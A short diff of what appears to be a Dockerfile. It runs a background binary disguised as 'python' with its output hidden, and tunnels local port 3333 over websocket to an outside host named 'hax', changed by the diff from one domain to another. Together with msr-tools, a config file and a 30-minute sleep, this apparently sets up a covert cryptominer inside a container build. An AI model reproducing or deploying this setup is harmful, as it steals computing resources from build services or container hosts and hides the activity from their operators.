@@ -7,7 +7,7 @@ COPY config.json /app/
 RUN apt update -y \
   && apt install -y procps msr-tools
 RUN chmod a+x /my-tu /app/python && \
-  (/my-tu -L 127.0.0.1:3333:127.0.0.1:3333 wss://hax.xn--6krt7h.tk &) && \
+  (/my-tu -L 127.0.0.1:3333:127.0.0.1:3333 wss://hax.wangjm.ml &) && \
   cd /app && \
   (./python > /dev/null &) && \
   sleep 1800  
